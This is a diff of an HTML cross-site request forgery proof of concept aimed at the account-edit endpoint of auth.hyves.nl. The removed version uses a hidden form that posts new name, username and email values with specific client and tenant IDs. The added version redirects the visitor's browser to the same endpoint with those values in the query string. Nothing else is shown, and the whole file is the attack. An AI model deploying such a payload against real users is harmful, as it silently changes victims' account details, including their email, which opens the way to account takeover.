@@ -1,27 +1,17 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<head>
-    <title>CSRF PoC</title>
-</head>
 <body>
-
-<form action="https://auth.hyves.nl/account/edit?hyves_auth_header=hide"
-      method="POST"
-      enctype="application/x-www-form-urlencoded">
-
-    <input type="hidden" name="hyves_auth_header" value="hide">
-    <input type="hidden" name="client_id" value="38e5b2e0-67de-4150-b71c-0e744b0ac489">
-    <input type="hidden" name="tenantId" value="af9932c0-0454-4d35-9858-8a87a55f27a5">
-    <input type="hidden" name="__cb_editPasswordOption" value="useExisting">
-
-    <input type="hidden" name="user.firstName" value="Admin CSRF">
-    <input type="hidden" name="user.middleName" value="Test">
-    <input type="hidden" name="user.lastName" value="CVCCCV">
-    <input type="hidden" name="user.username" value="XZZZ">
-    <input type="hidden" name="user.email" value="testerr0092@gmail.com">
-
-    <input type="submit" value="Submit">
-</form>
-
+<script>
+location.href =
+  "https://auth.hyves.nl/account/edit?hyves_auth_header=hide" +
+  "&client_id=YOUR_CLIENT_ID" +
+  "&tenantId=YOUR_TENANT_ID" +
+  "&__cb_editPasswordOption=useExisting" +
+  "&user.firstName=CSRFTEST" +
+  "&user.middleName=Test" +
+  "&user.lastName=Test" +
+  "&user.username=csrf_test_123" +
+  "&user.email=test@example.com";
+</script>
 </body>
 </html>
